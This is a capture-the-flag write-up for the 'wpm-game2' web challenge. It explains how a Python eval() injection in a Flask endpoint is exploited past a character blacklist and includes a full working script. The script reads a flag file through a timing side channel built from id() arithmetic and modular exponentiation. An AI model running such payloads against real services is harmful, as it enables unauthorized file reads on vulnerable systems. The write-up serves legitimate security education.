# Web/wpm-game2

Title: wpm-game2 

Points: 497 

Author: NoobMaster

No more development platform :(

## Unintended Explanation:

In the official solution, `id()` values were sourced from known characters already present in ```app.py```. The solution compared the IDs against the flag character and used a timing side channel to reveal the flag.

In my answer, I took a different approach: I used the flag prefix (`scriptCTF{`) to derive `id()` values using observed CPython address spacing between cached `id()` values. 

I also used Fermat's Little Theorem with modulo 127 to convert the ID difference into a clean inequality and to control the timing oracle to recover the flag.

Thus, the main difference is that my solution derives the `id()` values from CPython address spacing and Fermat's Little Theorem instead of getting it from `app.py()`.

## Solution:

**Step 1:**
From wpm-game, we know that the important vulnerability is the /rate endpoint, which does ```return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))```. 
The ```eval(wpm.lower())``` is very dangerous, and we can give the server a Python expression to run, and the server will run it.

For the first challenge, we were able to use it to read ```/app/flag.txt``` directly. However, when we run it here, it fails and gives an error instead of leaking the flag. This is because the description says ```No more development platform```, meaning the Flask debug/development platform used in the first challenge has been disabled/removed, so our old exploit no longer works.

This means we can't directly leak the flag, but may be able to use another method. A common method is using a side channel, where we do an expression like ```111 ** (condition * 1111111)```, where condition is whether the flag is correct or not. This works because if condition = 0, then the expression evaluates much faster.

This means:
```
Correct guess -> 111**0 = 1 -> fast
Wrong guess -> 111**1111111 = large number -> slow
```

**Step 2:**
Now that we have the general idea, we need to evade the filter.

My first thought was to brute-force each character with ```ord(flag[i])==ord(guess_char)```, but the problem is the following chars are filtered out just like in wpm-game:
```
disallowed = [".","_","import", "=", ",", "'", '"', "attr", "global", "local", ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and", "or", "eval", "exec", "for", "in", "chr", "ord", "hex", "int", "repr", "str", "dir", "set", "len", "SENTENCES", "random", "request", "app", "flask"]
```

First problem is the filter filters "=" and "ord", but since ```id()``` is not filtered, we can use ```id(flag[i])``` as a reference for string in the environment to compare it against the id of another known character we can get from the known flag prefix ```scriptCTF{``` to determine the ids of the other chars.

We then can use Fermat's Little Theorem, which states that 

$$
a^{p-1} \equiv 1 \pmod p
$$

as long as ```a``` and ```p``` are coprime (a is not divisible by p). The smallest prime above 126 is 127, so we can set that as the modulus. With p=127, every nonzero number becomes 1 after applying the equation, while $$0^{126}$$ remains 0.

For a, we can use id(flag[i]) - id(guess). So the formula becomes ```result = (id(flag[i])-id(guess))**126 % 127``` (Note: we can't directly use guess; we have to make it relative to other characters as described below). This returns 0 if the guess is correct and 1 otherwise. Then we can multiply the result by a huge exponent ```111 ** (result * 1111111)``` which will make it take significantly longer for wrong guesses.

This then gives us the timing oracle.

Since the flag prefix is ```scriptCTF{```, then we know ```id('s') == id(flag[0])```, ```id('c') == id(flag[1])```, etc. To get the id, we know ```id('c') == id(flag[1])``` so then we can use it as a reference.

In the challenge's Python environment (CPython), the cached ids had addresses spaced by 48 bytes. Since we know ```flag[1] == 'c'``` we can use ```id(flag[1])``` as a reference and derive the expected address for every ASCII character.

| Character | id |
|---|---|
| a | id(flag[1])-96 |
| b | id(flag[1])-48 |
| c | id(flag[1]) |
| d | id(flag[1])+48 |
| e | id(flag[1])+96 |

Then let's say we wanted to test if flag[i]=='e' then we would do ```result = (id(flag[i])-(id(flag[1])+96))**126 mod 127```. And if the result is 0, then the character would be 'e'.

The formula is: ```expected_id(guess) = id(flag[1]) + 48 * (ord(guess) - ord('c'))```

**Step 3:**

To make sure we know roughly when the cutoff is for a correct character (how fast it roughly has to be), we can test knowing ```flag[2] == 'r'```. I compare the timing of the known-correct guess ```(2, 'r')``` to the known-wrong guess ```(2, 'x')```. We take 3 tests for using the right char and 3 for using the wrong char and take the median of them. 
Taking the midpoint between the slow and fast medians gives us the cutoff

**Step 4:**
Since we already know it starts with **scriptCTF{** we skip that and start directly at i=9.
In the script, for each character, I test an ```alphabet = "_0123456789abcdefghijklmnopqrstuvwxyz-}"``` and measure the server response time. If it is faster than the cutoff, then the character is probably correct, and then I verify it one more time before accepting it because network timing can have errors.
I keep doing it until I reach "}" and then I stop.

Also, I used the same obfuscation functions for wpm-game (part 1) in ```n(x)``` and ```b(x)```. ```n(x)``` builds integers using allowed characters and ```b(x)``` constructs byte-strings without using blocked characters.

> Note: Since ```126 = -1 (mod 127)```, multiplying id(ref) by 126 is equivalent to subtracting it modulo 127. The value k then subtracts the expected 48-byte offset for the guessed character. If the guess is correct, it will result in 0 modulo 127.
```python
import requests
import time
import statistics
import string

url = "https://6731873d-1b29-4729-8484-552149d91bb0.challs.scriptsorcerers.xyz/rate"
s = requests.Session()

def n(x):
    if x == 0:
        return "id([])%1"

    out = []

    while x >= 111:
        out.append("111")
        x -= 111

    while x >= 11:
        out.append("11")
        x -= 11

    out += ["1"] * x
    return "+".join(out)

def b(txt):
    return "+".join(f"bytes([{n(ord(c))}])" for c in txt)

path = b("/app/flag.txt")
zero = "id([])%1"

def get_char(i):
    i = zero if i == 0 else n(i)
    return f"[*open({path})][{zero}][{i}]" #Takes the ith character of the first line of flag.txt

def make_payload(i, guess):
    c = get_char(i)
    ref = get_char(1)

    k = (-48 * (ord(guess) - ord("c"))) % 127

    r = f"(id({c})+({n(126)})*id({ref})"

    if k:
        r += f"+({n(k)})"

    r += f")%({n(127)})"

    check = f"(({r})**({n(126)}))%({n(127)})"
    payload = f"111**(({check})*1111111)"

    if len(set(payload)) > 18:
        print("bad payload", len(set(payload)), set(payload)) #limits number of distinct characters in payload
        exit()

    return payload

def test(i, guess):
    p = make_payload(i, guess)
    start = time.perf_counter()

    try:
        s.get(url, params={"wpm": p}, timeout=5)
    except:
        pass

    return time.perf_counter() - start

print("calibrating...")

good = [test(2, "r") for _ in range(3)]
bad = [test(2, "x") for _ in range(3)]

fast = statistics.median(good)
slow = statistics.median(bad)
cutoff = (fast + slow) / 2

print("correct:", good)
print("wrong:", bad)
print("cutoff:", cutoff)

if slow - fast < 0.15:
    print("timing difference looks too small")
    exit()

def check_char(i, c):
    t = test(i, c)
    print(i, repr(c), f"{t:.3f}s")

    if t < cutoff:
        t2 = test(i, c)
        return t2 < cutoff

    return False

flag = "scriptCTF{"
alphabet = "_0123456789abcdefghijklmnopqrstuvwxyz-}"

while not flag.endswith("}"):
    i = len(flag)
    found = False

    for c in alphabet:
        if check_char(i, c):
            flag += c
            found = True
            print("\n", flag, "\n")
            break

    if not found:
        print("couldn't find next char")
        break

print("flag:", flag)
```

After running it, I get the flag: **scriptCTF{r3v3ng3_1337_75f12c3e475b}**

## Summary:
1. Notice that the development platform is removed and that we can't directly exfiltrate the flag. See that it is possible to do a timing side channel and that ```/rate``` still evaluates attacker-controlled Python.
2. Build a timing oracle where a correct guess quickly evaluates to $$111^{0}$$ while an incorrect guess slowly computes $$111^{1111111}$$.
3. Adapt code to evade the filter by using ```id()``` and Fermat's Little Theorem instead of direct comparison.
4. Calculate the cutoff by using a known correct character from the flag prefix (```scriptCTF{```).
5. Use script and recover the flag using a timing oracle: **scriptCTF{r3v3ng3_1337_75f12c3e475b}**.
